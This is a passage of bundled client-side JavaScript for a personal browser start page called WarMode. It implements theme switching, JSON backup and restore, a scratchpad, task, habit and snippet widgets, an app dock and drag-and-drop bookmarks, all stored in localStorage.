    toggle.setAttribute('aria-label', dark ? 'Dark Mode on — switch to Light Mode' : 'Light Mode on — switch to Dark Mode');
    const label = document.getElementById('dark-mode-label');
    if (label) label.textContent = dark ? 'Dark' : 'Light';
  }
}

/**
 * Apply a dark palette by index. Switching to any dark palette also turns
 * Dark Mode back on, which is what a user expects after picking a theme.
 */
function applyTheme(index) {
  const safeIdx = ((index % DARK_THEMES.length) + DARK_THEMES.length) % DARK_THEMES.length;
  const theme = DARK_THEMES[safeIdx];
  persist(theme.id, safeIdx, true);
  paint(theme.id, theme.name);
  store.set('THEME', safeIdx);
  return theme;
}

/** Switch between the selected dark palette and the light palette. */
function setDarkMode(enabled, announce = false) {
  const dark = Boolean(enabled);
  if (dark) {
    applyTheme(getThemeIndex());
  } else {
    persist(LIGHT_THEME.id, getThemeIndex(), false);
    paint(LIGHT_THEME.id, LIGHT_THEME.name);
  }
  if (announce) showToast(dark ? '🌙 Dark Mode on' : '☀️ Light Mode on');
  return dark;
}

function toggleDarkMode() {
  return setDarkMode(!isDarkMode(), true);
}

/** Advance to the next dark palette (always exits light mode). */
function cycleTheme() {
  const next = (getThemeIndex() + 1) % DARK_THEMES.length;
  const theme = applyTheme(next);
  showToast(`Theme: ${theme.name}`);
  return theme;
}

function initTheme() {
  if (!isDarkMode()) {
    setDarkMode(false);
    return LIGHT_THEME;
  }
  return applyTheme(getThemeIndex());
}

/** Currently displayed palette, regardless of mode. */
function getActiveTheme() {
  if (!isDarkMode()) return LIGHT_THEME;
  return DARK_THEMES[getThemeIndex()] || DARK_THEMES[0];
}
    exports["DARK_THEMES"] = DARK_THEMES;
    exports["LIGHT_THEME"] = LIGHT_THEME;
    exports["THEMES"] = THEMES;
    exports["getThemeIndex"] = getThemeIndex;
    exports["isDarkMode"] = isDarkMode;
    exports["applyTheme"] = applyTheme;
    exports["setDarkMode"] = setDarkMode;
    exports["toggleDarkMode"] = toggleDarkMode;
    exports["cycleTheme"] = cycleTheme;
    exports["initTheme"] = initTheme;
    exports["getActiveTheme"] = getActiveTheme;
  });

  __def("backup", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var showToast = core.showToast;
    var dayKey = core.dayKey;

/**
 * Backup Module - Export / Import all WarMode data as JSON
 */




function exportAllData() {
  const payload = store.exportAll();
  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `warmode-backup-${dayKey(new Date())}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 1000);
  showToast('Backup JSON Downloaded');
}

function triggerImportData() {
  const input = document.getElementById('import-file');
  if (input) input.click();
}

function importAllData(e) {
  const input = e && e.target ? e.target : null;
  const file = input && input.files ? input.files[0] : null;
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (ev) => {
    try {
      const data = JSON.parse(ev.target.result);
      if (!data || typeof data !== 'object' || Array.isArray(data)) {
        throw new Error('not an object');
      }
      const known = Object.keys(data).filter(k => k.startsWith('traichu_'));
      if (known.length === 0) {
        showToast('Invalid Backup JSON');
        return;
      }
      store.importAll(data);
      showToast('Backup Restored! Reloading...');
      setTimeout(() => window.location.reload(), 900);
    } catch (err) {
      showToast('Invalid Backup JSON');
    }
  };
  reader.onerror = () => showToast('Could not read backup file');
  reader.readAsText(file);
}
    exports["exportAllData"] = exportAllData;
    exports["triggerImportData"] = triggerImportData;
    exports["importAllData"] = importAllData;
  });

  __def("scratchpad", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var showToast = core.showToast;
    var dayKey = core.dayKey;
    var backup = __req("backup");
    var exportAllData = backup.exportAllData;
    var triggerImportData = backup.triggerImportData;
    var importAllData = backup.importAllData;

/**
 * Scratchpad Module - Brain dump, telemetry, and JSON backup/restore
 */





const SCRATCHPAD_KEY = 'traichu_scratchpad';

function initScratchpad() {
  const sp = document.getElementById('scratchpad');
  if (!sp) return;

  sp.value = store.get('SCRATCHPAD') || '';
  updateScratchpadStats();

  sp.addEventListener('input', (e) => {
    store.set('SCRATCHPAD', e.target.value);
    updateScratchpadStats();
  });

  const fileInput = document.getElementById('import-file');
  if (fileInput) {
    fileInput.value = '';
  }
}

function updateScratchpadStats() {
  const sp = document.getElementById('scratchpad');
  const st = document.getElementById('sp-stats');
  if (!sp || !st) return;
  const val = sp.value.trim();
  const words = val ? val.split(/\s+/).length : 0;
  st.textContent = `${words}w · ${sp.value.length}c`;
}

function toggleScratchpad() {
  const wrap = document.getElementById('scratchpad-wrap');
  if (!wrap) return;
  const willShow = !wrap.classList.contains('show');
  wrap.classList.toggle('show', willShow);

  if (willShow) {
    updateScratchpadStats();
    const sp = document.getElementById('scratchpad');
    if (sp) sp.focus();
  } else {
    const q = document.getElementById('q');
    if (q) q.focus();
  }
}

function downloadScratchpad() {
  const sp = document.getElementById('scratchpad');
  if (!sp || !sp.value.trim()) {
    showToast('Scratchpad is empty');
    return;
  }
  const blob = new Blob([sp.value], { type: 'text/markdown;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `brain-dump-${dayKey(new Date())}.md`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 1000);
  showToast('Downloaded .md file');
}

function renderPomoChart() {
  const chart = document.getElementById('pomo-chart');
  if (!chart) return;
  chart.innerHTML = '';
  const days = [];
  let maxVal = 4;
  for (let i = 6; i >= 0; i--) {
    const d = new Date(Date.now() - i * 864e5);
    const count = +localStorage.getItem('traichu_pomo_' + dayKey(d)) || 0;
    if (count > maxVal) maxVal = count;
    const lbl = d.toLocaleDateString('en-US', { weekday: 'narrow' });
    days.push({ lbl, count });
  }
  const frag = document.createDocumentFragment();
  days.forEach(d => {
    const pct = Math.round((d.count / maxVal) * 100);
    const col = document.createElement('div');
    col.className = 'pomo-day';
    col.title = `${d.count} sessions`;
    col.innerHTML = `
      <div class="pomo-bar-wrap"><div class="pomo-bar" style="height:${pct}%"></div></div>
      <span class="pomo-lbl">${d.lbl}</span>
    `;
    frag.appendChild(col);
  });
  chart.appendChild(frag);
}

// Backup / restore (implemented in backup.js to keep localStorage concerns isolated)
    exports["initScratchpad"] = initScratchpad;
    exports["toggleScratchpad"] = toggleScratchpad;
    exports["downloadScratchpad"] = downloadScratchpad;
    exports["renderPomoChart"] = renderPomoChart;
    exports["exportAllData"] = exportAllData;
    exports["triggerImportData"] = triggerImportData;
    exports["importAllData"] = importAllData;
  });

  __def("widget", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var escapeHTML = core.escapeHTML;
    var showToast = core.showToast;
    var dayKey = core.dayKey;
    var copyText = core.copyText;

/**
 * Widget Module - Tasks, Habits, Snippets
 */




const PRIORITY_WEIGHT = { h: 3, m: 2, l: 1 };

function initWidget() {
  renderTodos();
  renderHabits();
  renderSnippets();
  checkDailyHabitReset();
  updateStreakBadge();

  store.subscribe('TODOS', renderTodos);
  store.subscribe('HABITS', () => {
    renderHabits();
    updateStreakBadge();
  });
  store.subscribe('SNIPPETS', renderSnippets);
}

function switchWidgetTab(tabName) {
  document.querySelectorAll('.w-tab').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.tab === tabName);
  });
  document.querySelectorAll('.widget-pane').forEach(pane => {
    pane.classList.toggle('active', pane.id === `tab-${tabName}`);
  });
  const clearBtn = document.getElementById('clear-done-btn');
  if (clearBtn) clearBtn.style.display = tabName === 'tasks' ? 'inline-block' : 'none';
}

function parsePriority(rawText) {
  let prio = null;
  let clean = String(rawText);
  const m = clean.match(/\s*!(h|m|l)\b/i);
  if (m) {
    prio = m[1].toLowerCase();
    clean = clean.replace(m[0], '').trim();
  }
  return { text: clean || String(rawText).trim(), prio };
}

/* ========== TODOS ========== */
function renderTodos() {
  const list = document.getElementById('todo-list');
  if (!list) return;
  const countEl = document.getElementById('todo-count');

  const todos = store.get('TODOS') || [];
  // Non-mutating sort so the store keeps insertion order.
  const sorted = todos
    .map((t, i) => ({ t, i }))
    .sort((a, b) => {
      const doneDiff = (a.t.done ? 1 : 0) - (b.t.done ? 1 : 0);
      if (doneDiff !== 0) return doneDiff;
      const prioDiff = (PRIORITY_WEIGHT[b.t.prio] || 0) - (PRIORITY_WEIGHT[a.t.prio] || 0);
      if (prioDiff !== 0) return prioDiff;
      return a.i - b.i;
    })
    .map(x => x.t);

  const doneCount = todos.filter(t => t.done).length;
  if (countEl) countEl.textContent = todos.length ? `(${doneCount}/${todos.length})` : '';

  list.innerHTML = '';
  const frag = document.createDocumentFragment();

  todos.forEach((t, i) => {
    const li = document.createElement('li');
    li.className = t.done ? 'todo-done' : '';
    const pill = t.prio
      ? `<span class="prio-pill prio-${escapeHTML(t.prio)}">${escapeHTML(t.prio)}</span>`
      : '';
    li.innerHTML = `
      <label>
        <input type="checkbox" ${t.done ? 'checked' : ''} data-idx="${i}" />
        ${pill}
        <span>${escapeHTML(t.text)}</span>
      </label>
      <div class="row-actions">
        <button type="button" class="delete-btn del-row-btn" data-idx="${i}" data-act="edit" title="Edit task">✏️</button>
        <button type="button" class="delete-btn del-row-btn" data-idx="${i}" data-act="del" title="Delete task">×</button>
      </div>
    `;
    frag.appendChild(li);
  });
  list.appendChild(frag);
}

function addTodo(e) {
  if (e.key !== 'Enter') return;
  e.preventDefault();
  const raw = e.target.value.trim();
  if (!raw) return;
  const { text, prio } = parsePriority(raw);
  const todos = store.get('TODOS');
  todos.push({ text, prio, done: false });
  store.set('TODOS', todos);
  e.target.value = '';
}

function editTodo(i) {
  const todos = store.get('TODOS');
  const item = todos[i];
  if (!item) return;
  const input = document.getElementById('todo-input');
  if (!input) return;
  input.value = item.text + (item.prio ? ` !${item.prio}` : '');
  todos.splice(i, 1);
  store.set('TODOS', todos);
  input.focus();
}

function toggleTodo(i) {
  const todos = store.get('TODOS');
  if (!todos[i]) return;
  todos[i].done = !todos[i].done;
  store.set('TODOS', todos);
}

function deleteTodo(i) {
  const todos = store.get('TODOS');
  if (!todos[i]) return;
  todos.splice(i, 1);
  store.set('TODOS', todos);
}

function clearDoneTodos() {
  const todos = store.get('TODOS');
  const remaining = todos.filter(t => !t.done);
  if (remaining.length === todos.length) {
    showToast('No completed tasks to clear');
    return;
  }
  store.set('TODOS', remaining);
  showToast('Cleared completed tasks');
}

/* ========== HABITS ========== */
function checkDailyHabitReset() {
  const today = dayKey(new Date());
  const lastDate = localStorage.getItem('traichu_habit_date');
  const habits = store.get('HABITS') || [];

  if (lastDate && lastDate !== today) {
    const allCompletedYesterday = habits.length > 0 && habits.every(h => h.done);
    let streak = +localStorage.getItem('traichu_streak') || 0;
    const yesterday = dayKey(new Date(Date.now() - 864e5));
    if (lastDate === yesterday && allCompletedYesterday) {
      streak += 1;
    } else if (lastDate !== yesterday) {
      streak = 0;
    }
    localStorage.setItem('traichu_streak', String(streak));
    habits.forEach(h => { h.done = false; });
    store.set('HABITS', habits);
  }
  localStorage.setItem('traichu_habit_date', today);
}

function updateStreakBadge() {
  const badge = document.getElementById('streak-badge');
  if (!badge) return;
  const streak = +localStorage.getItem('traichu_streak') || 0;
  const habits = store.get('HABITS') || [];
  const allDoneToday = habits.length > 0 && habits.every(h => h.done);
  const effective = streak + (allDoneToday ? 1 : 0);

  badge.textContent = `🔥 ${effective}d`;
  badge.dataset.active = String(effective > 0);
  badge.title = effective > 0
    ? `${effective} day${effective === 1 ? '' : 's'} of completing every habit`
    : 'Complete every habit today to start a streak';
  // A dormant streak is visual noise: hide it until it means something.
  badge.hidden = effective === 0 && !allDoneToday;
}

function renderHabits() {
  const list = document.getElementById('habit-list');
  if (!list) return;

  const habits = store.get('HABITS') || [];
  list.innerHTML = '';
  const frag = document.createDocumentFragment();

  habits.forEach((h, i) => {
    const li = document.createElement('li');
    li.className = h.done ? 'todo-done' : '';
    li.innerHTML = `
      <label>
        <input type="checkbox" ${h.done ? 'checked' : ''} data-idx="${i}" />
        <span>${escapeHTML(h.text)}</span>
      </label>
      <div class="row-actions">
        <button type="button" class="delete-btn del-row-btn" data-idx="${i}" data-act="edit" title="Edit habit">✏️</button>
        <button type="button" class="delete-btn del-row-btn" data-idx="${i}" data-act="del" title="Delete habit">×</button>
      </div>
    `;
    frag.appendChild(li);
  });
  list.appendChild(frag);
  updateStreakBadge();
}

function addHabit(e) {
  if (e.key !== 'Enter') return;
  e.preventDefault();
  const val = e.target.value.trim();
  if (!val) return;
  const habits = store.get('HABITS');
  habits.push({ text: val, done: false });
  store.set('HABITS', habits);
  e.target.value = '';
}

function editHabit(i) {
  const habits = store.get('HABITS');
  const item = habits[i];
  if (!item) return;
  const input = document.getElementById('habit-input');
  if (!input) return;
  input.value = item.text;
  habits.splice(i, 1);
  store.set('HABITS', habits);
  input.focus();
}

function toggleHabit(i) {
  const habits = store.get('HABITS');
  if (!habits[i]) return;
  habits[i].done = !habits[i].done;
  store.set('HABITS', habits);
}

function deleteHabit(i) {
  const habits = store.get('HABITS');
  if (!habits[i]) return;
  habits.splice(i, 1);
  store.set('HABITS', habits);
}

/* ========== SNIPPETS ========== */
function renderSnippets() {
  const list = document.getElementById('snippet-list');
  if (!list) return;

  const snippets = store.get('SNIPPETS') || [];
  list.innerHTML = '';
  const frag = document.createDocumentFragment();

  snippets.forEach((s, i) => {
    const li = document.createElement('li');
    li.innerHTML = `
      <div class="snip-item" data-idx="${i}" title="Click to copy">
        <span class="snip-title">${escapeHTML(s.title)}</span>
        <code class="snip-code">${escapeHTML(s.code)}</code>
      </div>
      <div class="row-actions">
        <button type="button" class="delete-btn del-row-btn" data-idx="${i}" data-act="edit" title="Edit snippet">✏️</button>
        <button type="button" class="delete-btn del-row-btn" data-idx="${i}" data-act="del" title="Delete snippet">×</button>
      </div>
    `;
    frag.appendChild(li);
  });
  list.appendChild(frag);
}

function copySnippet(i) {
  const snippets = store.get('SNIPPETS');
  const item = snippets[i];
  if (!item) return;
  copyText(item.code, `Copied: ${item.title}`);
}

function addSnippet(e) {
  if (e.key !== 'Enter') return;
  e.preventDefault();
  const raw = e.target.value.trim();
  if (!raw) return;
  const parts = raw.split('::');
  const title = parts.length > 1 ? parts[0].trim() : 'Snippet';
  const code = parts.length > 1 ? parts.slice(1).join('::').trim() : raw;
  if (!code) return;
  const snippets = store.get('SNIPPETS');
  snippets.push({ title: title || 'Snippet', code });
  store.set('SNIPPETS', snippets);
  e.target.value = '';
}

function editSnippet(i) {
  const snippets = store.get('SNIPPETS');
  const item = snippets[i];
  if (!item) return;
  const input = document.getElementById('snippet-input');
  if (!input) return;
  input.value = `${item.title} :: ${item.code}`;
  snippets.splice(i, 1);
  store.set('SNIPPETS', snippets);
  input.focus();
}

function deleteSnippet(i) {
  const snippets = store.get('SNIPPETS');
  if (!snippets[i]) return;
  snippets.splice(i, 1);
  store.set('SNIPPETS', snippets);
}

/* ------------------------------------------------------------------
 * Delegated click/change handling. Rendered rows are rebuilt on every
 * store change, so per-node listeners would leak; one delegated pair
 * on the widget container survives re-renders.
 * ------------------------------------------------------------------ */
function initWidgetEvents() {
  const widget = document.getElementById('notes-widget');
  if (!widget) return;

  const act = (e) => {
    const btn = e.target.closest('button[data-act]');
    if (!btn) return;
    const idx = parseInt(btn.dataset.idx, 10);
    if (!Number.isInteger(idx)) return;
    const kind = btn.dataset.act;
    const pane = btn.closest('.widget-pane');
    if (!pane) return;
    if (pane.id === 'tab-tasks') {
      if (kind === 'edit') editTodo(idx); else deleteTodo(idx);
    } else if (pane.id === 'tab-habits') {
      if (kind === 'edit') editHabit(idx); else deleteHabit(idx);
    } else if (pane.id === 'tab-snippets') {
      if (kind === 'edit') editSnippet(idx); else deleteSnippet(idx);
    }
  };

  const onChange = (e) => {
    const cb = e.target.closest('input[type="checkbox"][data-idx]');
    if (!cb) return;
    const idx = parseInt(cb.dataset.idx, 10);
    if (!Number.isInteger(idx)) return;
    const pane = cb.closest('.widget-pane');
    if (!pane) return;
    if (pane.id === 'tab-tasks') {
      toggleTodo(idx);
    } else if (pane.id === 'tab-habits') {
      toggleHabit(idx);
    }
  };

  const onClick = (e) => {
    const snip = e.target.closest('.snip-item');
    if (snip) {
      const idx = parseInt(snip.dataset.idx, 10);
      if (Number.isInteger(idx)) copySnippet(idx);
      return;
    }
    act(e);
  };

  widget.addEventListener('click', onClick);
  widget.addEventListener('change', onChange);
}
    exports["initWidget"] = initWidget;
    exports["switchWidgetTab"] = switchWidgetTab;
    exports["parsePriority"] = parsePriority;
    exports["renderTodos"] = renderTodos;
    exports["addTodo"] = addTodo;
    exports["editTodo"] = editTodo;
    exports["toggleTodo"] = toggleTodo;
    exports["deleteTodo"] = deleteTodo;
    exports["clearDoneTodos"] = clearDoneTodos;
    exports["checkDailyHabitReset"] = checkDailyHabitReset;
    exports["updateStreakBadge"] = updateStreakBadge;
    exports["renderHabits"] = renderHabits;
    exports["addHabit"] = addHabit;
    exports["editHabit"] = editHabit;
    exports["toggleHabit"] = toggleHabit;
    exports["deleteHabit"] = deleteHabit;
    exports["renderSnippets"] = renderSnippets;
    exports["copySnippet"] = copySnippet;
    exports["addSnippet"] = addSnippet;
    exports["editSnippet"] = editSnippet;
    exports["deleteSnippet"] = deleteSnippet;
    exports["initWidgetEvents"] = initWidgetEvents;
  });

  __def("dock", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var escapeHTML = core.escapeHTML;
    var safeHostname = core.safeHostname;
    var FALLBACK_ICON = core.FALLBACK_ICON;
    var showToast = core.showToast;
    var createElement = core.createElement;
    var normalizeUrl = core.normalizeUrl;

/**
 * Dock Module - Dynamic dock with add/edit/delete/drag
 */




let dragDockIndex = null;

function initDock() {
  renderDock();
  store.subscribe('DOCK', renderDock);
}

function renderDock() {
  const list = document.getElementById('dock-list');
  if (!list) return;

  list.querySelectorAll('.dynamic-dock').forEach(el => el.remove());
  const gmailLi = list.querySelector('.fixed-dock');
  const dockData = store.get('DOCK') || [];

  const frag = document.createDocumentFragment();

  dockData.forEach((item, idx) => {
    const href = normalizeUrl(item.url);
    const li = createElement('li', {
      className: 'dynamic-dock',
      dataset: { idx: String(idx) },
      draggable: document.body.classList.contains('edit-mode') ? 'true' : 'false',
    });

    li.style.setProperty('--c', item.color || 'var(--color-primary)');
    const domain = safeHostname(href);
    const iconUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=64`;
    const tooltip = document.body.classList.contains('edit-mode') ? `Click to Edit: ${item.name}` : item.name;

    li.innerHTML = `
      <a href="${escapeHTML(href)}" title="${escapeHTML(tooltip)}">
        <img src="${iconUrl}" class="dock-icon" alt="${escapeHTML(item.name)}" onerror="this.onerror=null;this.src='${FALLBACK_ICON}';">
      </a>
      <button type="button" class="delete-btn del-dock-btn" title="Delete App">×</button>
    `;

    li.querySelector('a').addEventListener('click', (e) => {
      if (document.body.classList.contains('edit-mode')) {
        e.preventDefault();
        openDockModal(idx);
      }
    });

    li.querySelector('.del-dock-btn').addEventListener('click', (e) => {
      e.stopPropagation();
      deleteDockItem(idx);
    });

    if (document.body.classList.contains('edit-mode')) {
      li.addEventListener('dragstart', handleDragStart);
      li.addEventListener('dragover', handleDragOver);
      li.addEventListener('dragleave', handleDragLeave);
      li.addEventListener('drop', handleDrop);
      li.addEventListener('dragend', handleDragEnd);
    }

    if (gmailLi && gmailLi.parentNode === list) {
      list.insertBefore(li, gmailLi);
    } else {
      list.insertBefore(li, list.lastElementChild || null);
    }
    // Fragment path fallback for shims / detached lists.
    if (li.parentNode !== list) frag.appendChild(li);
  });

  if (frag.childNodes && frag.childNodes.length) list.appendChild(frag);
}

function handleDragStart(e) {
  dragDockIndex = parseInt(this.dataset.idx, 10);
  e.dataTransfer.effectAllowed = 'move';
  setTimeout(() => this.classList.add('dock-dragging'), 0);
}

function handleDragOver(e) {
  e.preventDefault();
  this.classList.add('dock-drag-over');
}

function handleDragLeave() {
  this.classList.remove('dock-drag-over');
}

function handleDrop(e) {
  e.preventDefault();
  this.classList.remove('dock-drag-over');
  if (dragDockIndex === null) return;
  const targetIdx = parseInt(this.dataset.idx, 10);
  if (!Number.isInteger(targetIdx) || dragDockIndex === targetIdx) return;

  const dockData = store.get('DOCK');
  if (dragDockIndex < 0 || dragDockIndex >= dockData.length) return;
  const [movedItem] = dockData.splice(dragDockIndex, 1);
  const insertAt = Math.max(0, Math.min(targetIdx, dockData.length));
  dockData.splice(insertAt, 0, movedItem);
  dragDockIndex = null;
  store.set('DOCK', dockData);
}

function handleDragEnd() {
  this.classList.remove('dock-dragging');
}

function deleteDockItem(idx) {
  const dockData = store.get('DOCK');
  dockData.splice(idx, 1);
  store.set('DOCK', dockData);
  showToast("Dock app removed");
}

function openDockModal(editIdx = null) {
  const idxInput = document.getElementById('dock-edit-idx');
  const nameInput = document.getElementById('dock-site-name');
  const urlInput = document.getElementById('dock-site-url');
  const colorInput = document.getElementById('dock-site-color');
  const titleEl = document.getElementById('dock-modal-title');
  const dockData = store.get('DOCK');

  if (editIdx !== null && dockData[editIdx]) {
    idxInput.value = String(editIdx);
    nameInput.value = dockData[editIdx].name;
    urlInput.value = dockData[editIdx].url;
    colorInput.value = dockData[editIdx].color || '';
    if (titleEl) titleEl.textContent = 'EDIT DOCK APP';
  } else {
    idxInput.value = '';
    nameInput.value = '';
    urlInput.value = '';
    colorInput.value = '';
    if (titleEl) titleEl.textContent = 'ADD DOCK APP';
  }
  document.getElementById('dock-modal').classList.add('show');
  nameInput.focus();
}

function closeDockModal() {
  document.getElementById('dock-modal').classList.remove('show');
}

function saveDockSite() {
  const editIdxStr = document.getElementById('dock-edit-idx').value;
  const name = document.getElementById('dock-site-name').value.trim();
  const rawUrl = document.getElementById('dock-site-url').value.trim();
  const rawColor = document.getElementById('dock-site-color').value.trim();
  const color = /^#[0-9a-fA-F]{3,8}$/.test(rawColor) ? rawColor : 'var(--color-primary)';

  if (!name || !rawUrl) {
    showToast('Please enter both an App Name and URL');
    return;
  }

  const url = normalizeUrl(rawUrl);
  if (url === '#') {
    showToast('Please enter a valid http(s) URL');
    return;
  }

  const dockData = store.get('DOCK');

  if (editIdxStr !== '') {
    const idx = parseInt(editIdxStr, 10);
    if (dockData[idx]) {
      dockData[idx] = { name, url, color };
      showToast(`✔ Updated ${name}`);
    }
  } else {
    dockData.push({ name, url, color });
    showToast(`✔ Added ${name}`);
  }
  store.set('DOCK', dockData);
  closeDockModal();
}
    exports["initDock"] = initDock;
    exports["renderDock"] = renderDock;
    exports["openDockModal"] = openDockModal;
    exports["closeDockModal"] = closeDockModal;
    exports["saveDockSite"] = saveDockSite;
  });

  __def("bookmarks", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var escapeHTML = core.escapeHTML;
    var safeHostname = core.safeHostname;
    var FALLBACK_ICON = core.FALLBACK_ICON;
    var showToast = core.showToast;
    var createElement = core.createElement;
    var normalizeUrl = core.normalizeUrl;

/**
 * Bookmarks Module - 4 sections with add/edit/delete/drag
 */




let dragSource = { c: null, l: null };

function initBookmarks() {
  renderBookmarks();
  store.subscribe('BOOKMARKS', renderBookmarks);
}

function renderBookmarks() {
  const container = document.getElementById('bookmarks');
  if (!container) return;
  container.innerHTML = '';

  const bookmarksData = store.get('BOOKMARKS');
  const isEditMode = document.body.classList.contains('edit-mode');

  bookmarksData.forEach((section, cIdx) => {
    const ul = createElement('ul', { dataset: { cidx: cIdx } });

    if (isEditMode) {
      ul.addEventListener('dragover', handleDragOverUl);
      ul.addEventListener('drop', handleDropUl);
      ul.addEventListener('dragleave', () => ul.classList.remove('drag-over'));
    }

    ul.innerHTML = `
      <li class="col-title">
        <span ${isEditMode ? 'contenteditable="true" title="Click to rename category"' : ''} 
              onblur="window.updateColTitle?.(${cIdx}, this.innerText)" 
              spellcheck="false">${escapeHTML(section.title)}</span>
        <button type="button" class="edit-toggle add-btn" onclick="window.openSiteModal?.(${cIdx})" title="Add new link">+</button>
      </li>
    `;

    section.links.forEach((link, lIdx) => {
      const li = createElement('li', {
        className: 'bm-item',
        dataset: { cidx: String(cIdx), lidx: String(lIdx) },
        draggable: isEditMode ? 'true' : 'false',
      });

      const href = normalizeUrl(link.url);
      const domain = safeHostname(href);
      const iconUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=64`;

      li.innerHTML = `
        <a href="${escapeHTML(href)}" title="${isEditMode ? 'Click to Edit Link' : escapeHTML(link.url)}">
          <img src="${iconUrl}" class="favicon" alt="" onerror="this.onerror=null;this.src='${FALLBACK_ICON}';">
          ${escapeHTML(link.name)}
        </a>
        <button type="button" class="delete-btn del-btn" title="Remove link">×</button>
      `;

      li.querySelector('a').addEventListener('click', (e) => {
        if (isEditMode) {
          e.preventDefault();
          openSiteModal(cIdx, lIdx);
        }
      });

      li.querySelector('.del-btn').addEventListener('click', (e) => {
        e.stopPropagation();
        deleteSite(cIdx, lIdx);
      });

      if (isEditMode) {
        li.addEventListener('dragstart', handleDragStart);
        li.addEventListener('dragover', handleDragOverLi);
        li.addEventListener('drop', handleDropLi);
        li.addEventListener('dragleave', () => li.classList.remove('drag-over-top'));
        li.addEventListener('dragend', handleDragEnd);
      }

      ul.appendChild(li);
    });
    container.appendChild(ul);
  });

  // Expose functions globally for inline handlers
  window.updateColTitle = updateColTitle;
  window.openSiteModal = openSiteModal;
  window.deleteSite = deleteSite;
}

function handleDragStart(e) {
  e.dataTransfer.effectAllowed = 'move';
  e.dataTransfer.setData('text/plain', '');
  dragSource = { c: parseInt(this.dataset.cidx, 10), l: parseInt(this.dataset.lidx, 10) };
  setTimeout(() => this.classList.add('dragging'), 0);
}

function handleDragOverLi(e) {
  e.preventDefault();
  e.stopPropagation();
  this.classList.add('drag-over-top');
}

function handleDropLi(e) {
  e.preventDefault();
  e.stopPropagation();
  this.classList.remove('drag-over-top');
  moveBookmark(dragSource.c, dragSource.l, parseInt(this.dataset.cidx, 10), parseInt(this.dataset.lidx, 10));
}

function handleDragOverUl(e) {
  e.preventDefault();
  this.classList.add('drag-over');
}

function handleDropUl(e) {
  e.preventDefault();
  this.classList.remove('drag-over');
  const targetC = parseInt(this.dataset.cidx, 10);
  const bookmarksData = store.get('BOOKMARKS');
  moveBookmark(dragSource.c, dragSource.l, targetC, bookmarksData[targetC].links.length);
}

function handleDragEnd() {
  this.classList.remove('dragging');
  document.querySelectorAll('.drag-over-top, .drag-over').forEach(el => {
    el.classList.remove('drag-over-top', 'drag-over');
  });
}

function moveBookmark(fromC, fromL, toC, toL) {
  if (![fromC, fromL, toC, toL].every(Number.isInteger)) return;
  const bookmarksData = store.get('BOOKMARKS');
  if (!bookmarksData[fromC] || !bookmarksData[toC]) return;
  const fromLinks = bookmarksData[fromC].links;
  if (fromL < 0 || fromL >= fromLinks.length) return;
  if (fromC === toC && fromL === toL) return;

  const [item] = fromLinks.splice(fromL, 1);
  if (!item) return;

  const targetLinks = bookmarksData[toC].links;
  let insertAt = Number.isInteger(toL) ? toL : targetLinks.length;
  if (fromC === toC && toL > fromL) insertAt -= 1;
  insertAt = Math.max(0, Math.min(insertAt, targetLinks.length));
  targetLinks.splice(insertAt, 0, item);
  store.set('BOOKMARKS', bookmarksData);
}

function updateColTitle(colIndex, newTitle) {
  const bookmarksData = store.get('BOOKMARKS');
  bookmarksData[colIndex].title = newTitle.trim() || '// SECTION';
  store.set('BOOKMARKS', bookmarksData);
}

function deleteSite(colIndex, linkIndex) {
  const bookmarksData = store.get('BOOKMARKS');
  bookmarksData[colIndex].links.splice(linkIndex, 1);
  store.set('BOOKMARKS', bookmarksData);
}

function openSiteModal(colIndex, linkIndex = null) {
  document.getElementById('modal-section-idx').value = colIndex;
  const linkIdxInput = document.getElementById('modal-link-idx');
  const nameInput = document.getElementById('modal-site-name');
  const urlInput = document.getElementById('modal-site-url');
  const titleEl = document.getElementById('site-modal-title');
  const bookmarksData = store.get('BOOKMARKS');

  if (linkIndex !== null && bookmarksData[colIndex] && bookmarksData[colIndex].links[linkIndex]) {
    const item = bookmarksData[colIndex].links[linkIndex];
    linkIdxInput.value = String(linkIndex);
    nameInput.value = item.name;
    urlInput.value = item.url;
    if (titleEl) titleEl.textContent = 'EDIT TARGET_NODE';
  } else {
    linkIdxInput.value = '';
    nameInput.value = '';
    urlInput.value = '';
    if (titleEl) titleEl.textContent = 'ADD NEW TARGET_NODE';
  }
  document.getElementById('site-modal').classList.add('show');
  nameInput.focus();
}

function closeSiteModal() {
  document.getElementById('site-modal').classList.remove('show');
}

function saveNewSite() {
  const colIndex = parseInt(document.getElementById('modal-section-idx').value, 10);
  const linkIdxStr = document.getElementById('modal-link-idx').value;
  const name = document.getElementById('modal-site-name').value.trim();
  const rawUrl = document.getElementById('modal-site-url').value.trim();

  if (!name || !rawUrl) {
    showToast('Please enter both a Site Name and URL');
    return;
  }

  const url = normalizeUrl(rawUrl);
  if (url === '#') {
    showToast('Please enter a valid http(s) URL');
    return;
  }

  const bookmarksData = store.get('BOOKMARKS');
  const section = bookmarksData[colIndex];
  if (!section) {
    showToast('That section no longer exists');
    return;
  }

  if (linkIdxStr !== '') {
    const idx = parseInt(linkIdxStr, 10);
    if (section.links[idx]) {
      section.links[idx] = { name, url };
      showToast(`✔ Updated ${name}`);
    }
  } else {
    section.links.push({ name, url });
    showToast(`✔ Added ${name}`);
  }
  store.set('BOOKMARKS', bookmarksData);
  closeSiteModal();
}
    exports["initBookmarks"] = initBookmarks;
    exports["renderBookmarks"] = renderBookmarks;
